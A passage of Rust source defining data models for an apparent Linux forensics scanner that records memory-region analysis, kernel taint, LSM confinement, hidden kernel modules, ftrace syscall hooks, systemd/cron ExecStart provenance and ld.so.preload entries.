    #[serde(default)]
    pub programs: Vec<BpfProgInfo>,
    #[serde(default)]
    pub maps: Vec<BpfMapInfo>,
    #[serde(default)]
    pub pins: Vec<BpfPinInfo>,
    #[serde(default)]
    pub links: Vec<BpfLinkInfo>,
    /// Stable set of program tags (from fdinfo prog_tag) for drift detection.
    /// Sorted for reproducibility. Empty on legacy snapshots.
    #[serde(default)]
    pub prog_tags: Vec<String>,
}

// ── Deep Forensics (Pointer Resolution & Memory Analysis) ──

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeepMemoryAnalysis {
    pub origin: Origin,
    pub confidence: u8,             // 0..100
    pub entropy: f32,               // Shannon entropy
    pub prologue: Option<Prologue>, // ENDBR64 / PushRbp / None
    pub resolved_pointers: Vec<ResolvedPointer>,
    pub bytes_examined: usize,
    #[serde(default)]
    pub image_header: bool, // MZ / ELF / PE in the first bytes of RWX region
}

#[cfg(feature = "local-scan")]
impl DeepMemoryAnalysis {
    pub fn inconclusive() -> Self {
        Self {
            origin: Origin::Inconclusive,
            confidence: 0,
            entropy: 0.0,
            prologue: None,
            resolved_pointers: Vec::new(),
            bytes_examined: 0,
            image_header: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum Origin {
    FfiClosure,
    GObjectCallback,
    JitCode,
    RuntimeTrampoline,
    HotSpot,
    Pcre2Jit,
    UnknownPayload,
    Inconclusive,
    ManagedJit,     // generic managed-JIT shape (V8, JSC, Zend, PCRE2)
    ReservedBuffer, // empty/sparse reserved exec buffer — no payload
    /// Sixth Gate: map_files recovered a well-formed, low-entropy ET_DYN/ET_EXEC.
    GhostCleanImage,
    /// Sixth Gate: recovered payload failed ELF sanity or breached the entropy ceiling.
    GhostSuspectImage,
    /// Sixth Gate: read succeeded but content is mid-band / truncated — no assertion.
    GhostInconclusive,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum Prologue {
    Endbr64,
    PushRbp,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResolvedPointer {
    pub value: String,
    pub target: String,
    pub kind: PointerKind,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum PointerKind {
    LibText,
    JitCluster,
    LibData,
    Unmapped,
}

// ── NEW STRUCTURES (SEC-038/039/040) ──────────────────────────────────────

// ── Kernel taint (SEC-038) ────────────────────────────────────────────────

/// Decoded /proc/sys/kernel/tainted. `raw == 0` ⇒ clean kernel.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct KernelTaint {
    pub raw: u64,
    #[serde(default)]
    pub flags: Vec<TaintFlag>,
    /// True when the file was unreadable/unparseable — taint state UNKNOWN
    /// (distinct from a genuinely clean `raw == 0`).
    #[serde(default)]
    pub unavailable: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct TaintFlag {
    pub bit: u8,
    pub code: char,   // kernel letter, e.g. 'E'
    pub name: String, // human description
    /// True only for module-integrity bits that scoring escalates.
    #[serde(default)]
    pub security_relevant: bool,
}

// ── LSM confinement (SEC-039) ─────────────────────────────────────────────

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ConfinementReport {
    /// Active LSMs from /sys/kernel/security/lsm.
    #[serde(default)]
    pub lsms: Vec<String>,
    /// SELinux loaded AND permissive (/sys/fs/selinux/enforce == 0).
    #[serde(default)]
    pub selinux_permissive: bool,
    /// AppArmor profiles in complain mode (defined but not enforced).
    #[serde(default)]
    pub complain_profiles: Vec<ComplainProc>,
    /// True when per-process attr/current could not be fully read (non-root).
    #[serde(default)]
    pub attr_read_incomplete: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ComplainProc {
    pub pid: u32,
    pub comm: String,
    pub profile: String,
}

// ── Kernel module integrity (SEC-040) ─────────────────────────────────────

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct KernelModuleInventory {
    /// Module names from /proc/modules (canonical loadable list = lsmod).
    #[serde(default)]
    pub proc_modules: Vec<String>,
    /// Live loadable modules from /sys/module/*/initstate == "live".
    /// Built-ins (no initstate) are excluded — they would otherwise be FPs.
    #[serde(default)]
    pub sysfs_modules: Vec<String>,
    /// In sysfs(live)/kallsyms but ABSENT from /proc/modules ⇒ Diamorphine-class.
    #[serde(default)]
    pub hidden_candidates: Vec<HiddenModule>,
    /// False when /proc/kallsyms was empty/unreadable (kptr_restrict / no
    /// CONFIG_KALLSYMS) — the kallsyms leg was skipped.
    #[serde(default)]
    pub kallsyms_checked: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct HiddenModule {
    pub name: String,
    /// Interfaces that still expose it: "sysfs", "kallsyms".
    #[serde(default)]
    pub seen_in: Vec<String>,
}

// ── ftrace/kprobe hook surface (SEC-041) ──────────────────────────────────

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct FtraceHookInventory {
    /// Syscall-entry functions carrying an ftrace_ops with NO legitimate source
    /// (not BPF/kprobe/livepatch, no live tracer). Non-empty ⇒ ftrace-rootkit lead.
    #[serde(default)]
    pub unattributed_syscall_hooks: Vec<FtraceHook>,
    /// Kprobes on syscall functions (attributed observability; surfaced for context).
    #[serde(default)]
    pub syscall_kprobes: Vec<KprobeEntry>,
    /// Count of syscall hooks we could attribute (BPF/kprobe/livepatch/tracer/builtin).
    #[serde(default)]
    pub attributed_hook_count: usize,
    /// A live function tracer was running → attribution impossible → not flagged.
    #[serde(default)]
    pub live_tracer_active: bool,
    /// kptr_restrict hid callback symbols → unattributed hooks are informational.
    #[serde(default)]
    pub attribution_degraded: bool,
    /// tracefs was mounted & readable at all.
    #[serde(default)]
    pub tracefs_available: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct FtraceHook {
    pub function: String,
    pub ops_count: u32,
    /// "module:<name>" (callback lives in a module) or "unresolved" (kptr_restrict).
    pub callback: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct KprobeEntry {
    pub kind: char, // 'p' kprobe / 'r' kretprobe
    pub group_name: String,
    pub symbol: String,
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-043 – writability classification (no DB, stat(2) only)
// ═══════════════════════════════════════════════════════════════════════════

/// What a non-root principal can do to this exec target. Derived from stat(2)
/// alone — no package database — so it behaves identically on Debian, Fedora,
/// Alpine, Arch and NixOS, and inside containers where no DB exists at all.
/// This is the WEIGHTED signal for SEC-043; package ownership is inventory,
/// not privilege, and must never carry weight on its own (R22-29).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ExecWritability {
    /// Root-owned, not group/other-writable, parent likewise.
    #[default]
    RootOnly,
    /// The file or its parent directory is writable by a non-root principal —
    /// whoever that is can replace the bytes root executes.
    NonRootWritable,
    /// Path does not exist: a stale unit, or a payload dropped just-in-time.
    Missing,
    /// Could not stat (EACCES on a parent). Explicitly unknown — never
    /// silently folded into RootOnly.
    Unknown,
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-043: ExecStart provenance for systemd units and cron
// ═══════════════════════════════════════════════════════════════════════════

/// An executable path found in an ExecStart directive of a systemd unit or cron job,
/// flagged because it resides on an ephemeral/writable filesystem or lacks package ownership.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ExecStartFinding {
    /// "systemd:<unit>" or "cron:/etc/crontab" etc.
    pub source: String,
    /// Name of the unit or cron file
    pub unit_name: String,
    /// Absolute path of the unit/cron file that declared this entry.
    #[serde(default)]
    pub unit_path: String,
    /// Package owning the unit file itself — the AUTHORSHIP signal. A vendor
    /// unit pointing at a runtime-provisioned path (lxd-agent → /run/lxd_agent,
    /// cloud-init, dracut) is distro intent; an attacker's entry is unpackaged.
    /// Distinct from `package`, which describes the target and is inventory only.
    #[serde(default)]
    pub unit_package: Option<String>,
    /// The executable path extracted (first token after stripping prefixes)
    pub exec_path: String,
    /// True if the path is on a volatile filesystem
    pub volatile: bool,
    /// What a non-root user can do to this file (stat-based, no DB).
    #[serde(default)]
    pub writability: ExecWritability,
    /// Package that owns the file, if any
    pub package: Option<String>,
    /// True when the unit does NOT set `User=` (i.e. runs as root).
    /// Defaults to `true` for backward compatibility — legacy snapshots
    /// without this field are treated as root-executed (fail‑closed, R23‑06).
    #[serde(default = "crate::models::default_true")]
    pub runs_as_root: bool,
}

/// Serde default helper: returns `true`.  Used so that old snapshots without
/// the `runs_as_root` field are treated as root-executed (fail‑closed for SEC‑046).
pub(crate) fn default_true() -> bool {
    true
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-042: System-wide LD_PRELOAD (/etc/ld.so.preload)
// ═══════════════════════════════════════════════════════════════════════════

/// An entry found in /etc/ld.so.preload – a system-wide library that is
/// injected into every dynamically-linked process without a trace in per-process
/// environment or (if non-volatile) /proc/pid/maps.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PreloadFinding {
    /// Path to the preloaded shared object (as written in the file).
    pub path: String,
    /// True when the path resides on a volatile filesystem (tmpfs, devtmpfs, …).
    /// Non-volatile + unpackaged → strong IoC.
    pub volatile: bool,
    /// Resolved package name, if the file belongs to a known package.
    /// `None` if not from a package or provenance unavailable.
    pub package: Option<String>,
    /// Number of processes that have this object mapped (cross-referenced from
    /// /proc/<pid>/maps). Large numbers → systemic preload.
    #[serde(default)]
    pub mapped_by_pids: Option<usize>,
}
